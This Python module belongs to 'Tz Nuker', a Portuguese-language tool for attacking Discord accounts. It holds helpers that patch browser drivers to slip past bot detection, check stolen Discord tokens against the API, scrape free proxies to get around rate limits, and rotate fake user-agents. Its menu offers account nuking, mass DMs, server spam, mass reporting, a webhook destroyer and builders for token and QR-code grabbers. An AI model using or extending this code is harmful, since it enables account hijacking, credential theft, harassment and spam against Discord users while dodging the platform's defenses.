# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).

import os
import re
import io
import sys
import time
import json
import shutil
import ctypes
import random
import zipfile
import requests
import threading
import subprocess

from urllib.request import urlopen, urlretrieve
from distutils.version import LooseVersion
from bs4 import BeautifulSoup
from colorama import Fore
from time import sleep

THIS_VERSION = "2.4.1"


google_target_ver = 0
edge_target_ver = 0

class Chrome_Installer(object):
    installed = False
    target_version = None
    DL_BASE = "https://chromedriver.storage.googleapis.com/"

    def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
        self.platform = sys.platform

        if google_target_ver:
            self.target_version = google_target_ver

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]

        self._base = base_ = "chromedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_chromedriver()
            if not self.__class__.installed:
                if self.patch_binary():
                    self.__class__.installed = True

    @staticmethod
    def random_cdc():
        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
        cdc[-6:-4] = map(str.upper, cdc[-6:-4])
        cdc[2] = cdc[0]
        cdc[3] = "_"
        return "".join(cdc).encode()

    def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open(self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect


    def get_release_version_number(self):
        path = (
            "LATEST_RELEASE"
            if not self.target_version
            else f"LATEST_RELEASE_{self.target_version}"
        )
        return LooseVersion(urlopen(self.__class__.DL_BASE + path).read().decode())

    def fetch_chromedriver(self):
        base_ = self._base
        zip_name = base_.format(".zip")
        ver = self.get_release_version_number().vstring
        if os.path.exists(self.executable_path):
            return self.executable_path
        urlretrieve(
            f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
            filename=zip_name,
        )
        with zipfile.ZipFile(zip_name) as zf:
            zf.extract(self._exe_name)
        os.remove(zip_name)
        if sys.platform != "win32":
            os.chmod(self._exe_name, 0o755)
        return self._exe_name

class Edge_Installer(object):
    installed = False
    target_version = None
    DL_BASE = "https://msedgedriver.azureedge.net/"

    def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
        self.platform = sys.platform

        if edge_target_ver:
            self.target_version = edge_target_ver

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]

        self._base = base_ = "edgedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_edgedriver()
            if not self.__class__.installed:
                if self.patch_binary():
                    self.__class__.installed = True

    @staticmethod
    def random_cdc():
        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
        cdc[-6:-4] = map(str.upper, cdc[-6:-4])
        cdc[2] = cdc[0]
        cdc[3] = "_"
        return "".join(cdc).encode()

    def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open("ms"+self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect


    def get_release_version_number(self):
        path = (
            "LATEST_STABLE"
            if not self.target_version
            else f"LATEST_RELEASE_{str(self.target_version).split('.', 1)[0]}"
        )
        urlretrieve(
            f"{self.__class__.DL_BASE}{path}",
            filename=f"{os.getenv('temp')}\\{path}",
        )
        with open(f"{os.getenv('temp')}\\{path}", "r+") as f:
            _file = f.read().strip("\n")
            content = ""
            for char in [x for x in _file]:
                for num in ("0","1","2","3","4","5","6","7","8","9","."):
                    if char == num:
                        content += char
        return LooseVersion(content)

    def fetch_edgedriver(self):
        base_ = self._base
        zip_name = base_.format(".zip")
        ver = self.get_release_version_number().vstring
        if os.path.exists(self.executable_path):
            return self.executable_path
        urlretrieve(
            f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
            filename=zip_name,
        )
        with zipfile.ZipFile(zip_name) as zf:
            zf.extract("ms"+self._exe_name)
        os.remove(zip_name)
        if sys.platform != "win32":
            os.chmod(self._exe_name, 0o755)
        return self._exe_name

class Opera_Installer(object):
    DL_BASE = "https://github.com"
    def __init__(self, *args, **kwargs):
        self.platform = sys.platform
        self.links = ""

        r = requests.get(self.__class__.DL_BASE+"/operasoftware/operachromiumdriver/releases")
        soup = BeautifulSoup(r.text, 'html.parser')
        for link in soup.find_all('a'):
            if "operadriver" in link.get('href'):
                self.links += f"{link.get('href')}\n"

        for i in self.links.split("\n")[:4]:
            if self.platform in i:
                self.fetch_edgedriver(i)

    def fetch_edgedriver(self, driver):
        executable = "operadriver.exe"
        driver_name = driver.split("/")[-1]
        cwd = os.getcwd() + os.sep

        urlretrieve(self.__class__.DL_BASE+driver, filename=driver_name)
        with zipfile.ZipFile(driver_name) as zf:
            zf.extractall()
        shutil.move(cwd+driver_name[:-4]+os.sep+executable, cwd+executable)
        os.remove(driver_name)
        shutil.rmtree(driver_name[:-4])

# class Error(Exception):
#     '''Just for clearer errors'''
#     pass

def getDriver():
    #supported drivers
    drivers = ["chromedriver.exe", "msedgedriver.exe", "operadriver.exe"]
    print(f"\n{Fore.BLUE}Verificando o driver. . .")
    sleep(0.5)

    for driver in drivers:
        #Checking if driver already exists
        if os.path.exists(os.getcwd() + os.sep + driver):
            print(f"{Fore.GREEN}{driver} já existe, continuando. . .{Fore.RESET}")
            sleep(0.5)
            return driver
    else:
        print(f"{Fore.RED}Driver não encontrado! Instalando para você")
        #get installed browsers + install driver + return correct driver
        if os.path.exists(os.getenv('localappdata') + '\\Google'):
            Chrome_Installer()
            print(f"{Fore.GREEN}chromedriver.exe Installed!{Fore.RESET}")
            return "chromedriver.exe"
        elif os.path.exists(os.getenv('appdata') + '\\Opera Software\\Opera Stable'):
            Opera_Installer()
            print(f"{Fore.GREEN}operadriver.exe Installed!{Fore.RESET}")
            return "operadriver.exe"
        elif os.path.exists(os.getenv('localappdata') + '\\Microsoft\\Edge'):
            Edge_Installer()
            print(f"{Fore.GREEN}msedgedriver.exe Installed!{Fore.RESET}")
            return "msedgedriver.exe"
        else:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Nenhum driver compatível encontrado. . . Continuando com o chromedriver')
            Chrome_Installer()
            print(f"{Fore.GREEN}trying with chromedriver.exe{Fore.RESET}")
            return "chromedriver.exe"

def clear():
    system = os.name
    if system == 'nt':
        #if its windows
        os.system('cls')
    elif system == 'posix':
        #if its linux
        os.system('clear')
    else:
        print('\n'*120)
    return

def setTitle(_str):
    system = os.name
    if system == 'nt':
        #if its windows
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Feito por Tz")
    elif system == 'posix':
        #if its linux
        sys.stdout.write(f"\x1b]0;{_str} | Feito por Tz\x07")
    else:
        #if its something else or some err happend for some reason, we do nothing
        pass

def RandomChinese(amount, second_amount):
    name = u''
    for i in range(random.randint(amount, second_amount)):
        name = name + chr(random.randint(0x4E00,0x8000))
    return name

def SlowPrint(_str):
    for letter in _str:
        #slowly print out the words 
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)

def installPackage(dependencies):
    #get all installed libs
    process = subprocess.Popen(f"pip freeze", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    installed_packages = process.communicate()[0].decode().replace("\n","")
    for lib in dependencies:
        #check for missing libs 
        if lib not in installed_packages.lower():
            #install the lib if it wasn't found
            print(f"{Fore.BLUE}{lib}{Fore.RED} não encontrado! Instalando para você. . .{Fore.RESET}")
            process = subprocess.Popen(f"where python", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            try:
                python = process.communicate()[0].decode().split()[0]
                #if no python was found, or not installed
            except (KeyError, IndexError):
                print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Python não foi encontrado ou não está instalado neste dispositivo\n{Fore.YELLOW}Por favor, instale-o aqui {Fore.RESET}-> {Fore.BLUE}https://www.python.org{Fore.RESET}')
                sleep(2)
                SlowPrint("Digite qualquer coisa para continuar. . . ")
                input()
                os._exit(0)
            try:
                if "microsoft" in python[0].lower(): python = python[1] #this can easily be improved but too lazy
                if python == "": python = "python"
                subprocess.check_call([python, '-m', 'pip', 'install', lib])
            #incase something goes wrong we notify the user that something happend
            except Exception as e:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : {e}')
                sleep(0.5)

def hasNitroBoost(token):
    '''return True if they got nitro boost and False if they don't'''
    channelIds = requests.get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", headers=getheaders(token)).json()
    try:
        if channelIds[0]["type"] == 1:
            return True
    except Exception:
        return False

def validateToken(token):
    '''validate the token by contacting the discord api'''
    #define variables
    base_url = "https://discord.com/api/v9/users/@me"
    message = "Você precisa verificar sua conta para realizar esta ação."
    #contact discord api and see if you can get a valid response with the given token
    r = requests.get(base_url, headers=getheaders(token))
    if r.status_code != 200:
        #invalid token
        print(f"\n{Fore.RED}Token inválido.{Fore.RESET}")
        sleep(1)
        __import__("Tz").main()
    j = requests.get(f'{base_url}/billing/subscriptions', headers=getheaders(token)).json()
    #check if the account is phone locked
    try:
        if j["message"] == message:
            print(f"\n{Fore.RED}Token de telefone bloqueado.{Fore.RESET}")
            sleep(1)
            __import__("Tz").main()
    except (KeyError, TypeError, IndexError):
        pass

def validateWebhook(hook):
    #if the input is something like google.com or something else we check if it contains api/webhooks first
    if not "api/webhooks" in hook:
        print(f"\n{Fore.RED}Webhook inválida.{Fore.RESET}")
        sleep(1)
        __import__("Tz").main()
    try:
        #try and get a connection with the input
        responce = requests.get(hook)
    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema, requests.exceptions.ConnectionError):
        #connection failed
        print(f"\n{Fore.RED}Webhook inválida.{Fore.RESET}")
        sleep(1)
        __import__("Tz").main()
    try:
        #try and get a value from object
        j = responce.json()["name"]
    except (KeyError, json.decoder.JSONDecodeError):
        #if its a valid link but link isn't a webhook
        print(f"\n{Fore.RED}Webhook inválida.{Fore.RESET}")
        sleep(1)
        __import__("Tz").main()
    #webhook is valid
    print(f"{Fore.GREEN}Valid webhook! ({j})")

def proxy_scrape(): 
    proxieslog = []
    setTitle("Proxies de Raspagem")
    #start timer
    startTime = time.time()
    #create temp dir
    temp = os.getenv("temp")+"\\tz_proxies"
    print(f"{Fore.YELLOW}Por favor, aguarde enquanto Tz faz proxies para você!{Fore.RESET}")

    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        #get the proxies from all the sites with the custom regex
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    #all urls
    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://www.us-proxy.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://free-proxy-list.net/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://www.sslproxies.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
    threads = [] 
    for url in proxysources:
        #send them out in threads
        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp, "w") as f:
        for proxy in proxies:
            #create the same proxy 7-10 times to avoid ratelimit when using other options
            for i in range(random.randint(7, 10)):
                f.write(f"{proxy}\n")
    #get the time it took to scrape
    execution_time = (time.time() - startTime)
    print(f"{Fore.GREEN}Feito! {Fore.MAGENTA}{len(proxies): >5}{Fore.GREEN} no total => {Fore.RED}{temp}{Fore.RESET} | {execution_time}ms")
    setTitle(f"Tz Nuker {THIS_VERSION}")

def proxy():
    temp = os.getenv("temp")+"\\tz_proxies"
    #if the file size is empty
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[0]

    with open(temp, 'r+') as fp:
        #read all lines
        lines = fp.readlines()
        #get the first line
        fp.seek(0)
        #remove the proxy
        fp.truncate()
        fp.writelines(lines[1:])
    return proxy

#headers for optimazation
heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

                                                            #TIPOS DE FADE#
########################################################################################################################################################
def blackwhite(text):
    os.system(""); faded = ""
    red = 0; green = 0; blue = 0
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
        if not red == 255 and not green == 255 and not blue == 255:
            red += 20; green += 20; blue += 20
            if red > 255 and green > 255 and blue > 255:
                red = 255; green = 255; blue = 255
    return faded

def cyan(text):
    os.system(""); fade = ""
    blue = 100
    for line in text.splitlines():
        fade += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
        if not blue == 255:
            blue += 15
            if blue > 255:
                blue = 255
    return fade

def neon(text):
    os.system(""); fade = ""
    for line in text.splitlines():
        red = 255
        for char in line:
            red -= 2
            if red > 255:
                red = 255
            fade += (f"\033[38;2;{red};0;255m{char}\033[0m")
        fade += "\n"
    return fade

def purple(text):
    os.system(""); fade = "" 
    red = 255
    for line in text.splitlines():
        fade += (f"\033[38;2;{red};0;180m{line}\033[0m\n")
        if not red == 0:
            red -= 20
            if red < 0:
                red = 0
    return fade

def water(text):
    os.system(""); fade = ""
    green = 10
    for line in text.splitlines():
        fade += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return fade

def fire(text):
    os.system(""); fade = ""
    green = 250
    for line in text.splitlines():
        fade += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
        if not green == 0:
            green -= 25
            if green < 0:
                green = 0
    return fade
########################################################################################################################################################

def getTheme():
    themes = ["verde", "escuro", "vermelho", "azul", "neon"]
    with open(os.getenv("temp")+"\\tz_theme", 'r') as f:
        text = f.read()
        if not any(s in text for s in themes):
            print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Foi dado um tema inválido, Mudando para o padrão. . .')
            setTheme('verde')
            sleep(2.5)
            __import__("Tz").main()
        return text

def setTheme(new: str):
    with open(os.getenv("temp")+"\\tz_theme", 'w'): pass
    with open(os.getenv("temp")+"\\tz_theme", 'w') as f:
        f.write(new)

def banner(theme=None):
    if theme == "escuro":
        print(bannerTheme(blackwhite, blackwhite))
    elif theme == "vermelho":
        print(bannerTheme(fire, fire))
    elif theme == "azul":
        print(bannerTheme(water, cyan))
    elif theme == "neon":
        print(bannerTheme(purple, neon))
    else:
        print(f'''{Fore.GREEN}


        
                           ████████╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
                           ╚══██╔══╝╚══███╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                              ██║     ███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
                              ██║    ███╔╝         ██║   ██║   ██║██║   ██║██║     ╚════██║
                              ██║   ███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                              ╚═╝   ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝






> Criado por Tz
> https://instagram.com/tzfofo                                     '''.replace('█', f'{Fore.WHITE}█{Fore.GREEN}') + f'''   
{Fore.WHITE}──────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RESET}                      [{Fore.GREEN}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Conta Nuke                                  |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.LIGHTBLACK_EX} Bloquear amigos
{Fore.RESET}                      [{Fore.GREEN}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Desfazer amizade de todos os amigos         |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.LIGHTBLACK_EX} Modificador de perfil
{Fore.RESET}                      [{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Excluir e sair de todos os servidores       |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Em breve] 
{Fore.RESET}                      [{Fore.GREEN}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam Criar novos servidores                 |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} Criar Token Grabber 
{Fore.RESET}                      [{Fore.GREEN}5{Fore.RESET}]{Fore.LIGHTBLACK_EX} Deletar Dm's                                |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.LIGHTBLACK_EX} grabber de QR code
{Fore.RESET}                      [{Fore.GREEN}6{Fore.RESET}]{Fore.LIGHTBLACK_EX} Massa Dm                                    |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.LIGHTBLACK_EX} Report em massa
{Fore.RESET}                      [{Fore.GREEN}7{Fore.RESET}]{Fore.LIGHTBLACK_EX} Ativar modo de apreensão                    |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spammer de bate-papo em grupo
{Fore.RESET}                      [{Fore.GREEN}8{Fore.RESET}]{Fore.LIGHTBLACK_EX} Obter informações de uma conta pelo token   |{Fore.RESET}[{Fore.GREEN}17{Fore.RESET}]{Fore.LIGHTBLACK_EX} Destruidor de webhook
{Fore.RESET}                      [{Fore.GREEN}9{Fore.RESET}]{Fore.LIGHTBLACK_EX} Entrar em uma conta                         |{Fore.RESET}[{Fore.GREEN}18{Fore.RESET}]{Fore.RED} Configurações
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')

def bannerTheme(type1, type2):
    return type1(f'''

        

                           ████████╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
                           ╚══██╔══╝╚══███╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                              ██║     ███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
                              ██║    ███╔╝         ██║   ██║   ██║██║   ██║██║     ╚════██║
                              ██║   ███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                              ╚═╝   ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                                                





> Criado por Tz
> https://instagram.com/tzfofo                                                           ''')+type2('''  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                      [1] Conta Nuke                                  |[10] Bloquear amigos
                      [2] Desfazer amizade de todos os amigos         |[11] Modificador de perfil
                      [3] Excluir e sair de todos os servidores       |[12] [Em breve]
                      [4] Spam Criar novos servidores                 |[13] Criar Token Grabber 
                      [5] Deletar Dm's                                |[14] grabber de QR code
                      [6] Massa Dm                                    |[15] Report em massa
                      [7] Ativar modo de apreensão                    |[16] Spammer de bate-papo em grupo
                      [8] Obter informações de uma conta pelo token   |[17] Destruidor de webhook
                      [9] Entrar em uma conta                         |[18] Configurações
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')